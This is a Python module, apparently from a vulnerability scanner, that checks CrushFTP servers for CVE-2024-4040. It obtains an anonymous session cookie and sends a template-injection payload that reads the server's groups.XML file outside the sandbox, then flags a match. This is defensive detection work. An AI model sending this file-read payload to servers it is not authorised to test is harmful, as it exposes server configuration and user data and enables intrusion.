"""Agent Asteroid implementation for CVE-2024-4040"""

from typing import Any

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Unauthenticated arbitrary file read and remote code execution in CrushFTP"
)
VULNERABILITY_REFERENCE = "CVE-2024-4040"
VULNERABILITY_DESCRIPTION = (
    "A server side template injection vulnerability in CrushFTP in all versions before "
    "10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files "
    "from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative "
    "access, and perform remote code execution on the server."
)
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 30


@exploits_registry.register
class CVE20244040Exploit(definitions.Exploit):
    """CVE-2024-4040: Unauthenticated arbitrary file read and remote code execution in CrushFTP."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        has_public_exploit=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2024-4040"],
    )

    def __init__(self) -> None:
        self.token = ""
        self.session = definitions.HttpSession()

    def accept(self, target: definitions.Target) -> bool:
        try:
            self._login_anonymous(target.url)
            if self.token != "":
                return True
        except requests_exceptions.RequestException:
            return False

        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        vulnerabilities: list[definitions.Vulnerability] = []

        try:
            resp = self._prepare_request(target.url)
            if "<groups" in resp.text:
                vulnerability = self.create_vulnerability(target)
                vulnerabilities.append(vulnerability)

                return vulnerabilities

        except requests_exceptions.RequestException:
            return vulnerabilities

        return vulnerabilities

    def _login_anonymous(self, target: str) -> None:
        r = self.session.get(target + "WebInterface/", timeout=DEFAULT_TIMEOUT)
        c = r.cookies.get_dict()
        if "CrushAuth" not in c:
            raise requests_exceptions.RequestException

        self.token = c["CrushAuth"]

    def _prepare_headers(self) -> dict[str, str]:
        h = {}
        if self.token != "":
            current_auth = self.token[-4:] if len(self.token) >= 4 else ""
            h["Cookie"] = f"CrushAuth={self.token}; currentAuth={current_auth}"

        return h

    def _prepare_request(self, target: str) -> Any:
        h = self._prepare_headers()
        current_auth = self.token[-4:] if len(self.token) >= 4 else ""
        data = {
            "command": "exists",
            "random": "0.34712915617878926",
            "paths": "<INCLUDE>users/MainUsers/groups.XML</INCLUDE>",
        }
        if current_auth != "":
            data["c2f"] = current_auth
        r = self.session.post(
            target + "WebInterface/function/",
            timeout=DEFAULT_TIMEOUT,
            headers=h,
            data=data,
        )
        return r
